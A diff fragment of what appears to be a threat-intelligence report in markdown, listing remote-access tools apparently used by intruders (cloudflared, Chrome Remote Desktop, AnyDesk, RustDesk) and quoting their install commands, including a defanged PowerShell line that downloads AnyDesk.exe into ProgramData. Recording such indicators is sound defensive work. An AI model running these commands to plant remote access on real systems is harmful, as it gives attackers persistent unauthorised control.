@@ -266,13 +266,16 @@ cloudflared[.]exe service install REDACTED
 _BASE64_TOKEN
 - Chrome remote desktop
 - Anydesk
+
 ```
 “C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" -command
 "(new-object
 System.Net.WebClient).DownloadFile('hxxp://download[.]anydesk[.]com/AnyDesk
 .exe';, 'C:\ProgramData\AnyDesk.exe')"
 ```
+
 - rustdesk
+
 ```
 "C:\Windows\System32\cmd.exe" /C
 C:\Users\ADMINI~1\AppData\Local\Temp\RustDesk_install.bat
